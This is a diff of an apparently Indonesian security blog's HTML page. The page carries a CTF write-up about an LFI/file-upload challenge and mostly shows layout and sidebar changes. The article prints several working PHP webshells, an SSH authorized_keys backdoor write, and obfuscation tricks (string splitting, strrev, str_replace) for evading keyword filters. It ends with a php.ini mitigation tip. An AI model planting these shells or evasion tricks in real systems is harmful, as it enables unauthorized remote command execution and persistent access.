@@ -37,15 +37,6 @@ if (!doNotTrack) {
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
     <script data-ad-client="ca-pub-1926937123072670" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-	<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async></script>
-	<script>
-		var OneSignal = window.OneSignal || [];
-		OneSignal.push(function() {
-		  OneSignal.init({
-			appId: "6a6c99a5-9957-48e6-a3be-0d88a9b5850b",
-		  });
-		});
-	</script>
 </head>
 <body class="body">
 	<div id="loading"></div>
@@ -154,32 +145,32 @@ Write nick to solver.txt <code>echo &quot;nick&quot; &gt;&gt; solver.txt</code><
 <p><img src="/img/ramadhan/18.webp" alt="nick written"><br>
 Nick tertulis :3</p>
 <p>Namun ketika challenges ini dikerjakan oleh teman-teman yang ada pada group SHL, cukup menarik, karena banyak yang tidak menggunakan <code>`</code> untuk menulis nick, ada yang melalui command php files, dan beberapa trik evasion agar file txt tidak terdeteksi sebagai malware/virus ketika di upload seperti berikut</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=@</span>$_GET[<span style="color:#a6e22e">a</span>]($_GET[<span style="color:#a6e22e">b</span>])<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>@ pada kode di atas untuk menonaktifkan display error yang akan muncul, kemudian ada 2 index / parameter yaitu a dan b yang dimana index / param b berada di dalam kurung setelah index /param a sehingga player melakukan request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> maka fungsi system akan terpanggil karena dengan request tersebut maka sama saja dengan <code>&lt;?php system('id') ?&gt;</code> karena pada server fungsi shell tidak dimatikan melalui php.ini<br>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=@</span>$_GET[<span style="color:#a6e22e">a</span>]($_GET[<span style="color:#a6e22e">b</span>])<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>@ pada kode di atas untuk menonaktifkan display error yang akan muncul, kemudian ada 2 index / parameter yaitu a dan b yang dimana index / param b berada di dalam kurung setelah index /param a sehingga player melakukan request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> maka fungsi system akan terpanggil karena dengan request tersebut maka sama saja dengan <code>&lt;?php system('id') ?&gt;</code> karena pada server fungsi shell tidak dimatikan melalui php.ini<br>
 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/home/challshl/.ssh/authorized_keys&#39;</span>, <span style="color:#e6db74">&#39;ssh-rsa AAxa---snip---DDyt user@host&#39;</span>)<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>Menggunakan fungsi file_put_contents() untuk memasukan public key ke dalam authorized_keys di folder .ssh<br>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/home/challshl/.ssh/authorized_keys&#39;</span>, <span style="color:#e6db74">&#39;ssh-rsa AAxa---snip---DDyt user@host&#39;</span>)<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Menggunakan fungsi file_put_contents() untuk memasukan public key ke dalam authorized_keys di folder .ssh<br>
 Dengan begini player mendapatkan akses shell melalui ssh tanpa harus login karena public key sudah tersimpan pada server<br>
 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span>
 $func <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sh&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ell&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ex&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ec&#34;</span>; 
 $ups <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;ups&#39;</span>];
 <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> $func($ups) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
 </code></pre></div><p>Kode di atas menggunakan fungsi shell_exec() yang dimana fungsi tersebut telah di block (check source code at <a href="https://github.com/laztname/notAcms/">here</a>) namun tetap bisa digunakan karena tidak ada pengecekan kata sh, ell, ex, ec kata tersebut dipisah namun disatukan kembali sehingga dapat menggunakan fungsi shell_exec()<br>
 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span> 
 $shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cexe_llehs&#34;</span>;
 <span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">strrev</span>($shell($_GET[<span style="color:#e6db74">&#39;x&#39;</span>])));
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>Kode di atas sangat sederhana, hanya membalik kata shell_exec menjadi cexe_llehs, karena kata tersebut tidak diblacklist maka file tetap terupload, tapi pada kode tersebut menggunakan fungsi strrev() dimana fungsi tersebut membalikan urutan kata, sehingga player dapat menjalankan fungsi shell_exec()<br>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Kode di atas sangat sederhana, hanya membalik kata shell_exec menjadi cexe_llehs, karena kata tersebut tidak diblacklist maka file tetap terupload, tapi pada kode tersebut menggunakan fungsi strrev() dimana fungsi tersebut membalikan urutan kata, sehingga player dapat menjalankan fungsi shell_exec()<br>
 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span> 
 $cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;x&#39;</span>];
 $shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;szhezlzl_ezxezc&#34;</span>;
 $shell <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;z&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$shell);
 <span style="color:#66d9ef">echo</span> $shell($cmd);
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>Kode diatas dapat menjalankan fungsi shell_exec() karena dari kata <code>szhezlzl_ezxezc</code> dan dihilangkan huruf z menjadi <code>shell_exec</code> menggunakan fungsi str_replace()</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Kode diatas dapat menjalankan fungsi shell_exec() karena dari kata <code>szhezlzl_ezxezc</code> dan dihilangkan huruf z menjadi <code>shell_exec</code> menggunakan fungsi str_replace()</p>
 <p>Cukup banyak sekali tips dan trik untuk melakukan evasion agar webshell / backdoor tidak terdeteksi oleh waf atau sanitasi manual, dan sebagai langkah pencegahan untuk menghindari penggunaan shell dapat menonaktifkan fungsi shell seperti system, shell_exec dsb melalui file php.ini</p>
 <p>Jika kalian ingin mencoba challenges simple ini, kalian dapat melakukannya dengan membuat lab sederhana, source code challenges ini dapat di download di <a href="https://github.com/laztname/notAcms">sini</a><br>
 dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat melihat video <a href="https://youtu.be/qqarbngfrNk">ini</a></p>
@@ -295,11 +286,11 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 	<h4 class="widget__title">Recent Posts</h4>
 	<div class="widget__content">
 		<ul class="widget__list">
-			<li class="widget__item"><a class="widget__link" href="/posts/retas-io-hellbound-vm-write-up/">Retas.io Hellbound VM Write-up</a></li>
-			<li class="widget__item"><a class="widget__link" href="/posts/retas-io-zombie-vm-write-up/">Retas.io Zombie VM Write-up</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/bash-job-management-and-shortcut/">Manajemen Job dan Shortcut pada Terminal</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/solution-for-mhl-challenges/">Penyelesaian Challenges Malang Hacker Link</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/solution-for-shl-challenges-heaven-vm/">Penyelesaian Challenges Surabaya Hacker Link VM Heaven</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/harderning-server-with-fail2ban-to-telegram/">Harderning Server with Fail2ban and Reporting to Telegram</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/solution-for-qr-generator-challenges/">Solution for QR Generator Challenges</a></li>
 		</ul>
 	</div>
 </div>
@@ -309,6 +300,9 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		<ul class="widget__list">
 			<li class="widget__item">
 				<a class="widget__link" href="/categories/defensive/">Defensive</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/development/">Development</a>
 			</li>
 			<li class="widget__item">
 				<a class="widget__link" href="/categories/offensive/">Offensive</a>
@@ -326,7 +320,7 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 <div class="widget-taglist widget">
 	<h4 class="widget__title">Tags</h4>
 	<div class="widget__content">
-		<a class="widget-taglist__link widget__link btn" href="/tags/challenges/" title="Challenges">Challenges (8)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/challenges/" title="Challenges">Challenges (6)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/dvcs-ripper/" title="dvcs-ripper">dvcs-ripper (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/fail2ban/" title="Fail2ban">Fail2ban (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/file-upload/" title="File Upload">File Upload (1)</a>
@@ -338,13 +332,13 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		<a class="widget-taglist__link widget__link btn" href="/tags/lfi/" title="LFI">LFI (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/malang-hacker-link/" title="Malang Hacker Link">Malang Hacker Link (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/rce/" title="RCE">RCE (2)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/retas-labs/" title="Retas Labs">Retas Labs (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/sqli/" title="SQLI">SQLI (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/surabaya-hacker-link/" title="Surabaya Hacker Link">Surabaya Hacker Link (5)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/telegram-bot/" title="Telegram bot">Telegram bot (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/terminal/" title="Terminal">Terminal (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/virtual-machine/" title="Virtual Machine">Virtual Machine (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/wordpress/" title="Wordpress">Wordpress (1)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (9)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (7)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/xss/" title="XSS">XSS (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/zimbra-mail-server/" title="Zimbra mail server">Zimbra mail server (1)</a>
 	</div>
